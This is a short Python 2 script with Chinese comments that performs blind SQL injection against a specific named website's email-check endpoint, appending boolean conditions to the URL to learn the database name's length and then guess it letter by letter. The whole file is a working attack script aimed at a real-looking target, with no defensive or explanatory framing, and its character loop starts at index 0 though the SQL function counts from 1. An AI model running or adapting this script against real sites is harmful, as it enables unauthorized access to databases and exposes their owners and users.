#!/usr/bin/env python 
#coding=utf-8 
import urllib 
#获取当前数据库长度,并猜解出来 
url='https://www.haochedai.com/index.php?user&q=reg&type=sendemail&checkemail=admin' 
payloads='abcdefghijklmnopqrstuvwxyz' 
table1='' 
for i in range(1,15): 
  payload1=' and length(database())=%s' %i 
  r1=urllib.urlopen(url+payload1).read() 
  if 'xanxus' in r1: 
    print '当前数据库长度是：',i 
    for x in range(0,i): 
      for p in payloads: 
        payload2=' and mid(database(),%s,1)=\'%s\'' %(x,p) 
        r2=urllib.urlopen(url+payload2).read() 
        if 'xanxus' in r2: 
          table1+=p 
          print table1
